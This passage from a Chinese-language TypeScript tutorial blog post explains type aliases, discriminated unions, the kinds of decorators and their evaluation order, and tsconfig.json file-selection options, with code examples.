<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">type Name = string;</span><br><span class="line">type NameResolver = <span class="function">() =&gt;</span> string;</span><br><span class="line">type NameOrResolver = Name | NameResolver;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params">n: NameOrResolver</span>): <span class="title">Name</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> n === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> n();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同接口一样，类型别名也可以是泛型</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">type Container&lt;T&gt; = &#123; <span class="attr">value</span>: T &#125;;</span><br></pre></td></tr></table></figure>

<p>也可以使用类型别名来在属性里引用自己，常用于树状结构</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">type Tree&lt;T&gt; = &#123;</span><br><span class="line">    value: T;</span><br><span class="line">    left: Tree&lt;T&gt;;</span><br><span class="line">    right: Tree&lt;T&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="接口和类型别名的差别"><a href="#接口和类型别名的差别" class="headerlink" title="接口和类型别名的差别"></a>接口和类型别名的差别</h6><p>1.接口创建了一个新的名字，可以在其它任何地方使用。 类型别名并不创建新名字—比如，错误信息就不会使用别名</p>
<p>下面的代码中，在编译器中将鼠标悬停在 <code>interfaced</code>上，显示它返回的是 <code>Interface</code>，但悬停在 <code>aliased</code>上时，显示的却是对象字面量类型</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">type Alias = &#123; <span class="attr">num</span>: number &#125;</span><br><span class="line">interface Interface &#123;</span><br><span class="line">    num: number;</span><br><span class="line">&#125;</span><br><span class="line">declare <span class="function"><span class="keyword">function</span> <span class="title">aliased</span>(<span class="params">arg: Alias</span>): <span class="title">Alias</span>;</span></span><br><span class="line"><span class="function"><span class="title">declare</span> <span class="title">function</span> <span class="title">interfaced</span>(<span class="params">arg: Interface</span>): <span class="title">Interface</span>;</span></span><br></pre></td></tr></table></figure>

<p>2.类型别名不能被 <code>extends</code>和 <code>implements</code>（自己也不能 <code>extends</code>和 <code>implements</code>其它类型）。 因为软件中的对象应该对于扩展是开放的，但是对于修改是封闭的，你应该尽量去使用接口代替类型别名</p>
<h6 id="可辨识联合"><a href="#可辨识联合" class="headerlink" title="可辨识联合"></a>可辨识联合</h6><ul>
<li><p>具有普通的单例类型属性-可辨识的特征。</p>
</li>
<li><p>一个类型别名包含了那些类型的联合-联合。</p>
</li>
<li><p>此属性上的类型保护。</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Square &#123;</span><br><span class="line">    kind: <span class="string">&quot;square&quot;</span>;</span><br><span class="line">    size: number;</span><br><span class="line">&#125;</span><br><span class="line">interface Rectangle &#123;</span><br><span class="line">    kind: <span class="string">&quot;rectangle&quot;</span>;</span><br><span class="line">    width: number;</span><br><span class="line">    height: number;</span><br><span class="line">&#125;</span><br><span class="line">interface Circle &#123;</span><br><span class="line">    kind: <span class="string">&quot;circle&quot;</span>;</span><br><span class="line">    radius: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Shape = Square | Rectangle | Circle;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">area</span>(<span class="params">s: Shape</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (s.kind) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;square&quot;</span>: <span class="keyword">return</span> s.size * s.size;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;rectangle&quot;</span>: <span class="keyword">return</span> s.height * s.width;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;circle&quot;</span>: <span class="keyword">return</span> <span class="built_in">Math</span>.PI * s.radius ** <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="6、装饰器"><a href="#6、装饰器" class="headerlink" title="6、装饰器"></a>6、装饰器</h5><blockquote>
<p>随着TypeScript和ES6里引入了类，在一些场景下我们需要额外的特性来支持标注或修改类及其成员。 装饰器（Decorators）为我们在类的声明及成员上通过元编程语法添加标注提供了一种方式。装饰器属性是一项试验性特性，要想使用该特性，需要再命令行或者配置文件<code>tsconfig.json</code>里面启用<code>experimentalDecorators</code>编译器选项。</p>
</blockquote>
<h6 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tsc --target ES5 --experimentalDecorators</span><br></pre></td></tr></table></figure>

<h6 id="配置文件tsconfig-json"><a href="#配置文件tsconfig-json" class="headerlink" title="配置文件tsconfig.json"></a>配置文件<code>tsconfig.json</code></h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;compilerOptions&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;target&quot;</span>: <span class="string">&quot;ES5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;experimentalDecorators&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、访问符、属性、参数上。 装饰器使用 <code>@expression</code>这种形式，<code>expression</code>求值后必须为一个函数，它会在运行时被调用，被装饰的声明信息做为参数传入。</p>
</blockquote>
<h6 id="定义一个装饰器"><a href="#定义一个装饰器" class="headerlink" title="定义一个装饰器"></a>定义一个装饰器</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logStr</span>(<span class="params">target</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@logStr</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h6 id="装饰器工厂"><a href="#装饰器工厂" class="headerlink" title="装饰器工厂"></a>装饰器工厂</h6><p>装饰器工厂就是一个简单的函数，返回一个表达式，以供装饰器在运行时调用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logStr</span>(<span class="params">msg: string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// do something with target and msg</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@logStr(<span class="string">&#x27;this is a decorator func&#x27;</span>)</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h6 id="装饰器组合"><a href="#装饰器组合" class="headerlink" title="装饰器组合"></a>装饰器组合</h6><p>多个装饰器可以同时应用到一个声明上</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@aaaa</span><br><span class="line">@bbb</span><br><span class="line">@ccc</span><br><span class="line">@ddd</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>在Typescript中，当多个装饰器应用到同一个声明中时，会进行以下步骤的操作</p>
<ul>
<li>由上到下依次对装饰器表达式求值</li>
<li>求值的结果会被当做函数，由下到上依次调用</li>
</ul>
<p>使用装饰器工厂的时候，求值的顺序时由上到下，调用的顺序是由下到上。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;f(): evaluated&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target, propertyKey: string, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;f(): called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;g(): evaluated&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target, propertyKey: string, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;g(): called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    @f()</span><br><span class="line">    @g()</span><br><span class="line">    method() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行结果如下</span></span><br><span class="line">f(): evaluated</span><br><span class="line">g(): evaluated</span><br><span class="line">g(): called</span><br><span class="line">f(): called</span><br></pre></td></tr></table></figure>

<h6 id="装饰器求值"><a href="#装饰器求值" class="headerlink" title="装饰器求值"></a>装饰器求值</h6><p>类中不同声明上的装饰器将按以下规定的顺序应用</p>
<ul>
<li><p>参数装饰器，然后依次是方法装饰器，访问符装饰器，或属性装饰器应用到每个实例成员</p>
</li>
<li><p>参数装饰器，然后依次是方法装饰器，访问符装饰器，或属性装饰器应用到每个静态成员</p>
</li>
<li><p>参数装饰器应用到构造函数</p>
</li>
<li><p>类装饰器应用到类</p>
</li>
</ul>
<h6 id="类装饰器"><a href="#类装饰器" class="headerlink" title="类装饰器"></a>类装饰器</h6><p>在类声明之前被声明，应用于类构造函数，可以用来监视，修改或替换类定义</p>
<p>类装饰器表达式会在运行时当作函数被调用，<strong>类的构造函数作为其唯一的参数</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义类装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sealed</span>(<span class="params">constructor: Function</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">Object</span>.seal(<span class="keyword">constructor</span>);</span><br><span class="line">    Object.seal(<span class="keyword">constructor</span>.prototype);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 使用类装饰器</span><br><span class="line">@sealed</span><br><span class="line">class Greeter &#123;</span><br><span class="line">    greeting: string;</span><br><span class="line">    <span class="keyword">constructor</span>(message: string) &#123;</span><br><span class="line">        <span class="built_in">this</span>.greeting = message;</span><br><span class="line">    &#125;</span><br><span class="line">    greet() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + <span class="built_in">this</span>.greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当@sealed被执行的时候，它将密封此类的构造函数和原型</span></span><br></pre></td></tr></table></figure>

<h6 id="方法装饰器"><a href="#方法装饰器" class="headerlink" title="方法装饰器"></a>方法装饰器</h6><p>声明在一个方法的声明之前，可以用来监视，修改或者替换方法定义</p>
<p>方法装饰器表达式会在运行时当作函数被调用，传入3个参数：</p>
<ul>
<li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象</li>
<li>成员的名字</li>
<li>成员的属性描述符</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义方法装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enumerable</span>(<span class="params">value: boolean</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target: any, propertyKey: string, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">        descriptor.enumerable = value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greeter</span> </span>&#123;</span><br><span class="line">    greeting: string;</span><br><span class="line">    <span class="keyword">constructor</span>(message: string) &#123;</span><br><span class="line">        <span class="built_in">this</span>.greeting = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用方法装饰器</span></span><br><span class="line">    @enumerable(<span class="literal">false</span>)</span><br><span class="line">    greet() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + <span class="built_in">this</span>.greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上代码，当装饰器被调用的时候，会修改属性描述符的<code>enumerable</code>属性</p>
<h6 id="访问器装饰器"><a href="#访问器装饰器" class="headerlink" title="访问器装饰器"></a>访问器装饰器</h6><p>声明在一个访问器的声明之前，可以用来监视，修改或替换一个访问器的定义</p>
<p>访问器装饰器表达式会在运行时当作函数被调用，传入3个参数：</p>
<ul>
<li>对于静态成员来说是类的构造函数，对于实例成员来说是类的原型对象</li>
<li>成员的名字</li>
<li>成员的属性描述符</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义访问器装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">configurable</span>(<span class="params">value: boolean</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target: any, propertyKey: string, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">        descriptor.configurable = value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    private _x: number;</span><br><span class="line">    private _y: number;</span><br><span class="line">    <span class="keyword">constructor</span>(x: number, y: number) &#123;</span><br><span class="line">        <span class="built_in">this</span>._x = x;</span><br><span class="line">        <span class="built_in">this</span>._y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用访问器装饰器</span></span><br><span class="line">    @configurable(<span class="literal">false</span>)</span><br><span class="line">    <span class="keyword">get</span> <span class="title">x</span>() &#123; <span class="keyword">return</span> <span class="built_in">this</span>._x; &#125;</span><br><span class="line"></span><br><span class="line">    @configurable(<span class="literal">false</span>)</span><br><span class="line">    <span class="keyword">get</span> <span class="title">y</span>() &#123; <span class="keyword">return</span> <span class="built_in">this</span>._y; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="属性装饰器"><a href="#属性装饰器" class="headerlink" title="属性装饰器"></a>属性装饰器</h6><p>声明在一个属性声明之前</p>
<p>属性装饰器表达式会在运行时当作函数被调用，传入下列2个参数：</p>
<ul>
<li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象</li>
<li>成员的名字</li>
</ul>
<p>记录属性的元数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;reflect-metadata&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formatMetadataKey = <span class="built_in">Symbol</span>(<span class="string">&quot;format&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义@format装饰器和getFormat函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params">formatString: string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.metadata(formatMetadataKey, formatString);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFormat</span>(<span class="params">target: any, propertyKey: string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.getMetadata(formatMetadataKey, target, propertyKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greeter</span> </span>&#123;</span><br><span class="line">    @format(<span class="string">&quot;Hello, ts&quot;</span>)</span><br><span class="line">    greeting: string;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(message: string) &#123;</span><br><span class="line">        <span class="built_in">this</span>.greeting = message;</span><br><span class="line">    &#125;</span><br><span class="line">    greet() &#123;</span><br><span class="line">        <span class="keyword">let</span> formatString = getFormat(<span class="built_in">this</span>, <span class="string">&quot;greeting&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> formatString.replace(<span class="string">&quot;ts&quot;</span>, <span class="built_in">this</span>.greeting);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="参数装饰器"><a href="#参数装饰器" class="headerlink" title="参数装饰器"></a>参数装饰器</h6><p>声明在一个参数声明之前</p>
<p>参数装饰器表达式会在运行时当作函数被调用，传入下列3个参数：</p>
<ul>
<li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象</li>
<li>成员的名字</li>
<li>参数在函数参数列表中的索引</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;reflect-metadata&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> requiredMetadataKey = <span class="built_in">Symbol</span>(<span class="string">&quot;required&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">required</span>(<span class="params">target: Object, propertyKey: string | symbol, parameterIndex: number</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> existingRequiredParameters: number[] = <span class="built_in">Reflect</span>.getOwnMetadata(requiredMetadataKey, target, propertyKey) || [];</span><br><span class="line">    existingRequiredParameters.push(parameterIndex);</span><br><span class="line">    <span class="built_in">Reflect</span>.defineMetadata(requiredMetadataKey, existingRequiredParameters, target, propertyKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">target: any, propertyName: string, descriptor: TypedPropertyDescriptor&lt;Function&gt;</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> method = descriptor.value;</span><br><span class="line">    descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> requiredParameters: number[] = <span class="built_in">Reflect</span>.getOwnMetadata(requiredMetadataKey, target, propertyName);</span><br><span class="line">        <span class="keyword">if</span> (requiredParameters) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> parameterIndex <span class="keyword">of</span> requiredParameters) &#123;</span><br><span class="line">                <span class="keyword">if</span> (parameterIndex &gt;= <span class="built_in">arguments</span>.length || <span class="built_in">arguments</span>[parameterIndex] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Missing required argument.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> method.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greeter</span> </span>&#123;</span><br><span class="line">    greeting: string;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(message: string) &#123;</span><br><span class="line">        <span class="built_in">this</span>.greeting = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @validate</span><br><span class="line">    greet(@required name: string) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name + <span class="string">&quot;, &quot;</span> + <span class="built_in">this</span>.greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="7、配置文件"><a href="#7、配置文件" class="headerlink" title="7、配置文件"></a>7、配置文件</h5><p>Typescript项目的配置文件为<code>tsconfig.json</code></p>
<h6 id="使用配置文件"><a href="#使用配置文件" class="headerlink" title="使用配置文件"></a>使用配置文件</h6><ul>
<li>不带任何输入文件的情况下调用<code>tsc</code>，编译器会从当前目录开始去查找<code>tsconfig.json</code>文件，逐级向上搜索父目录。</li>
<li>不带任何输入文件的情况下调用<code>tsc</code>，且使用命令行参数<code>--project</code>（或<code>-p</code>）指定一个包含<code>tsconfig.json</code>文件的目录。</li>
</ul>
<h6 id="files属性"><a href="#files属性" class="headerlink" title="files属性"></a>files属性</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;files&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;index.ts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;index2.ts&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>指定编译哪些文件</p>
<h6 id="include属性"><a href="#include属性" class="headerlink" title="include属性"></a>include属性</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;include&quot;</span>: [<span class="string">&#x27;src/**/*.ts&#x27;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译<code>src</code>目录下所有的<code>.ts</code>后缀的文件</p>
<h6 id="exclude属性"><a href="#exclude属性" class="headerlink" title="exclude属性"></a>exclude属性</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;exclude&quot;</span>: [<span class="string">&quot;node_modules&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译时排除<code>node_modules</code>文件夹</p>
<h6 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h6><blockquote>
<p>如果一个glob模式里的某部分只包含<code>*</code>或<code>.*</code>，那么仅有支持的文件扩展名类型被包含在内（比如默认<code>.ts</code>，<code>.tsx</code>，和<code>.d.ts</code>， 如果 <code>allowJs</code>设置能<code>true</code>还包含<code>.js</code>和<code>.jsx</code>）。</p>
<p>如果<code>&quot;files&quot;</code>和<code>&quot;include&quot;</code>都没有被指定，编译器默认包含当前目录和子目录下所有的TypeScript文件（<code>.ts</code>, <code>.d.ts</code> 和 <code>.tsx</code>），排除在<code>&quot;exclude&quot;</code>里指定的文件。JS文件（<code>.js</code>和<code>.jsx</code>）也被包含进来如果<code>allowJs</code>被设置成<code>true</code>。 如果指定了 <code>&quot;files&quot;</code>或<code>&quot;include&quot;</code>，编译器会将它们结合一并包含进来。 使用 <code>&quot;outDir&quot;</code>指定的目录下的文件永远会被编译器排除，除非你明确地使用<code>&quot;files&quot;</code>将其包含进来（这时就算用<code>exclude</code>指定也没用）</p>
</blockquote>
<h6 id="编译选项属性"><a href="#编译选项属性" class="headerlink" title="编译选项属性"></a>编译选项属性</h6><p>详细编译选项属性请参考：<a href="https://www.tslang.cn/docs/handbook/compiler-options.html">编译器选项</a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Typescript</tag>
      </tags>
  </entry>
</search>
